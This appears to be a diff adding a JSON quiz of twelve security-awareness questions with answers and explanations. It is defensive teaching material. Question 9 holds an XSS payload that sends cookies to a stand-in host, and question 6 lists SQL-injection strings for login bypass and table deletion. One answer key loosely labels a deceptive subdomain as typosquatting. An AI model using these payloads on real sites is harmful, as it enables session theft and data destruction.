@@ -1,0 +1,86 @@
+[
+  {
+    "id": 1, "difficulty": "easy",
+    "question": "You receive an email saying your bank account is suspended and you must click a link to verify. The sender is 'security@bank0famerica.com'. What should you do?",
+    "options": ["Click the link immediately — account security is urgent", "Check the sender domain carefully before clicking anything", "Reply to the email asking for more information", "Forward it to your colleague to check"],
+    "correct": 1,
+    "explanation": "The domain 'bank0famerica.com' uses a zero (0) instead of the letter 'o'. Always inspect sender domains character by character for typosquatting."
+  },
+  {
+    "id": 2, "difficulty": "easy",
+    "question": "Which of these is a strong, unique password?",
+    "options": ["Password123!", "yourname1990", "Tr#9mK!2xP@vL7qN", "qwerty"],
+    "correct": 2,
+    "explanation": "A strong password is long (12+ chars), uses mixed case, numbers, and symbols, and contains no dictionary words or personal info. Password managers can generate and store these."
+  },
+  {
+    "id": 3, "difficulty": "easy",
+    "question": "What does HTTPS in a URL guarantee?",
+    "options": ["The website is legitimate and trustworthy", "The connection is encrypted between you and the server", "The site has no malware", "The site's identity has been verified by the government"],
+    "correct": 1,
+    "explanation": "HTTPS only means traffic is encrypted in transit — it does NOT mean the site is safe. Phishing sites regularly use HTTPS. Always verify the domain, not just the padlock."
+  },
+  {
+    "id": 4, "difficulty": "medium",
+    "question": "An attacker intercepts traffic between you and your bank by setting up a rogue WiFi hotspot. This is called:",
+    "options": ["SQL Injection", "Cross-Site Scripting", "Man-in-the-Middle Attack", "Ransomware"],
+    "correct": 2,
+    "explanation": "A Man-in-the-Middle (MitM) attack positions the attacker between victim and server. Use VPNs on public WiFi and ensure HSTS is enabled in your browser."
+  },
+  {
+    "id": 5, "difficulty": "medium",
+    "question": "You find a USB drive in the company parking lot labeled 'Q4 Salaries - CONFIDENTIAL'. What should you do?",
+    "options": ["Plug it in to see who it belongs to and return it", "Plug it into an isolated VM to check safely", "Hand it to IT security without plugging it in anywhere", "Throw it in the trash so no one else finds it"],
+    "correct": 2,
+    "explanation": "This is a classic 'USB drop' social engineering attack. Malicious firmware can execute before any OS scan runs. Always hand unknown media to IT security."
+  },
+  {
+    "id": 6, "difficulty": "medium",
+    "question": "Which SQL injection payload is designed to bypass a login form?",
+    "options": ["SELECT * FROM users", "'; DROP TABLE users; --", "' OR '1'='1' --", "UNION SELECT password FROM users"],
+    "correct": 2,
+    "explanation": "' OR '1'='1' -- turns the WHERE clause always-true, bypassing password checks. The -- comments out the rest of the query. Parameterized queries prevent this."
+  },
+  {
+    "id": 7, "difficulty": "medium",
+    "question": "What is 'credential stuffing'?",
+    "options": ["Using brute force to guess all possible passwords", "Testing leaked username/password pairs from other breaches against new targets", "Embedding credentials in malware", "Phishing for credentials via SMS"],
+    "correct": 1,
+    "explanation": "Credential stuffing exploits password reuse. Attackers buy breach databases and test them at scale against banks, email, and SaaS. Use unique passwords and MFA everywhere."
+  },
+  {
+    "id": 8, "difficulty": "medium",
+    "question": "Your CEO sends you an urgent email from their personal Gmail asking you to urgently transfer €50,000. What type of attack is this likely?",
+    "options": ["Ransomware", "Business Email Compromise (BEC) / Whaling", "DDoS Attack", "SQL Injection"],
+    "correct": 1,
+    "explanation": "This is 'whaling' — spear phishing targeting executives, or BEC (Business Email Compromise). Always verify financial requests via a separate communication channel (phone call)."
+  },
+  {
+    "id": 9, "difficulty": "hard",
+    "question": "An attacker injects <script>fetch('https://evil.com?c='+document.cookie)</script> into a forum post. What vulnerability is this?",
+    "options": ["SQL Injection", "Stored Cross-Site Scripting (XSS)", "CSRF", "Command Injection"],
+    "correct": 1,
+    "explanation": "This is Stored XSS — malicious JavaScript is saved in the database and executes in every visitor's browser, stealing their session cookies for account takeover."
+  },
+  {
+    "id": 10, "difficulty": "hard",
+    "question": "What is the 3-2-1 backup rule?",
+    "options": ["3 passwords, 2 factors, 1 device", "3 copies of data, on 2 different media types, with 1 copy offsite", "3 users, 2 admins, 1 backup admin", "Backup every 3 days, verify every 2 days, test restore monthly"],
+    "correct": 1,
+    "explanation": "The 3-2-1 rule is the gold standard backup strategy: 3 total copies, 2 on different storage types (e.g., HDD + cloud), 1 offsite. Critical protection against ransomware."
+  },
+  {
+    "id": 11, "difficulty": "hard",
+    "question": "Which header helps prevent XSS attacks by restricting which scripts can execute on a page?",
+    "options": ["X-Frame-Options", "Content-Security-Policy (CSP)", "Strict-Transport-Security (HSTS)", "X-Content-Type-Options"],
+    "correct": 1,
+    "explanation": "Content-Security-Policy (CSP) defines which sources are trusted for scripts, styles, and other resources. A strict CSP can prevent most XSS attacks even if injection occurs."
+  },
+  {
+    "id": 12, "difficulty": "hard",
+    "question": "An attacker registers 'microsoft.com.login-verify.net'. Which attack technique does this domain demonstrate?",
+    "options": ["Subdomain Takeover", "Homograph Attack", "Typosquatting", "Domain Shadowing"],
+    "correct": 2,
+    "explanation": "Typosquatting (also: domain confusion). 'microsoft.com' appears in the URL but it's actually a subdomain of 'login-verify.net'. Always read domains right-to-left from the TLD."
+  }
+]
